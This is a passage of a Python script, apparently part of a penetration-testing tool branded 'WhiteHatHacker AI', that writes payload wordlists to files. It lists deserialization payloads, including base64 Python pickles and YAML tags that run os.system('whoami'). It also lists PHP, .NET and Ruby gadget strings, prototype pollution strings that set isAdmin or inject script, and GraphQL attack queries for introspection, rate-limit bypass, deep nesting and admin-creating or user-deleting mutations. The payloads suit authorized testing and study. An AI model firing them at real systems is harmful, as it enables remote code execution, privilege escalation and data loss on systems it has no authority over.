        'O:8:"stdClass":0:{}',  # PHP
        'a:1:{s:4:"test";s:4:"test";}',  # PHP array
        'O:4:"Test":1:{s:3:"cmd";s:6:"whoami";}',  # PHP object
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:4:"test";s:4:"test";}',  # Laravel
        # Python pickle
        "Y29zCnN5c3RlbQooUyd3aG9hbWknCnRSLg==",  # base64 pickle: os.system('whoami')
        "gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAd3aG9hbWmUhZRSlC4=",
        # .NET
        "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5",
        # YAML deserialization
        "!!python/object/apply:os.system ['whoami']",
        "!!python/object/new:subprocess.check_output [['whoami']]",
        # Ruby
        '--- !ruby/object:Gem::Installer i: x',
        '--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection ? |',
    ]
    with open(deser_path, "w") as f:
        f.write("# ============================================================================\n")
        f.write("# WhiteHatHacker AI — Deserialization Payloads (v3.0)\n")
        f.write("# Categories: Java, PHP, Python Pickle, .NET, YAML, Ruby\n")
        f.write(f"# Total: {len(deser)} payloads\n")
        f.write("# ============================================================================\n\n")
        for p in deser:
            f.write(p + "\n")

    # === PROTOTYPE POLLUTION PAYLOADS ===
    proto_path = os.path.join(PAYLOAD_DIR, "prototype_pollution.txt")
    proto = [
        '__proto__[isAdmin]=true',
        '__proto__[role]=admin',
        '__proto__[constructor][prototype][isAdmin]=true',
        'constructor[prototype][isAdmin]=true',
        'constructor.prototype.isAdmin=true',
        '__proto__.isAdmin=true',
        '__proto__[status]=200',
        '__proto__[innerHTML]=<img src=x onerror=alert(1)>',
        '__proto__[src]=data:text/html,<script>alert(1)</script>',
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        '{"__proto__":{"polluted":"yes"}}',
        '__proto__[__proto__][isAdmin]=true',
        '__proto__[shell]=node',
        '__proto__[NODE_OPTIONS]=--require=/proc/self/environ',
    ]
    with open(proto_path, "w") as f:
        f.write("# ============================================================================\n")
        f.write("# WhiteHatHacker AI — Prototype Pollution Payloads (v3.0)\n")
        f.write("# Categories: Object key injection, Constructor chain, JSON body\n")
        f.write(f"# Total: {len(proto)} payloads\n")
        f.write("# ============================================================================\n\n")
        for p in proto:
            f.write(p + "\n")

    # === GRAPHQL PAYLOADS ===
    gql_path = os.path.join(PAYLOAD_DIR, "graphql.txt")
    gql = [
        # Introspection
        '{"query":"{ __schema { types { name } } }"}',
        '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }"}',
        '{"query":"{ __type(name: \\"User\\") { name fields { name type { name kind } } } }"}',
        '{"query":"{__schema{queryType{name}mutationType{name}types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}}"}',
        # Alias brute force (rate limit bypass)
        '{"query":"{ a1: user(id: 1) { id } a2: user(id: 2) { id } a3: user(id: 3) { id } }"}',
        # Batch query
        '[{"query":"{ user(id: 1) { id } }"},{"query":"{ user(id: 2) { id } }"}]',
        # Depth attack
        '{"query":"{ user { friends { friends { friends { friends { name } } } } } }"}',
        # Directive overloading
        '{"query":"query @skip(if: false) @include(if: true) { user { name } }"}',
        # Mutation guessing
        '{"query":"mutation { createUser(input: {role: \\"admin\\"}) { id } }"}',
        '{"query":"mutation { updateUser(id: \\"1\\", input: {role: \\"admin\\"}) { id } }"}',
        '{"query":"mutation { deleteUser(id: \\"1\\") { success } }"}',
        # Field suggestion exploitation
        '{"query":"{ usre { name } }"}',  # Typo to trigger field suggestions
    ]
    with open(gql_path, "w") as f:
        f.write("# ============================================================================\n")
        f.write("# WhiteHatHacker AI — GraphQL Payloads (v3.0)\n")
        f.write("# Categories: Introspection, Alias Brute Force, Batch, Depth,\n")
        f.write("#   Mutation Guessing, Directive Overloading\n")
        f.write(f"# Total: {len(gql)} payloads\n")
        f.write("# ============================================================================\n\n")
        for p in gql:
            f.write(p + "\n")

    return len(jwt) + len(deser) + len(proto) + len(gql)


if __name__ == "__main__":
    xss_count = generate_xss()
    print(f"XSS payloads: {xss_count}")
    sqli_count = generate_sqli()
    print(f"SQLi payloads: {sqli_count}")
    ssrf_count = generate_ssrf()
    print(f"SSRF payloads: {ssrf_count}")
    new_count = generate_new_categories()
    print(f"New categories: {new_count}")
    print(f"Total new/expanded: {xss_count + sqli_count + ssrf_count + new_count}")
